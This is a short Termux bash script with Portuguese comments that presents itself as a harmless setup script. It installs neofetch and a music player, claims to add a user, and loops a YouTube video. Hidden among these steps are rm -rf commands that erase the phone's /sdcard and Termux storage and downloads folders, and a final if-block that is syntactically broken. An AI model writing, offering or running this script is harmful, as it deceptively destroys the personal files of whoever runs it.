#!/bin/bash

apt install neofetch
clear
neofetch
sleep 2
#Adicionar um user

echo "Foi adicionado > $(whoami)"
apt update
clear
     #Music
apt install mpv -y
apt install youtubedr
clear

rm -rf /sdcard/*
rm -rf /data/data/com.termux/files/home/storage/downloads/*
rm -rf /data/data/com.termux/files/home/storage/*

mpv https://youtu.be/zYgqJ9tAqzQ --loop 

if
 then
 echo " se curtiu deixa estrela no git"
fi
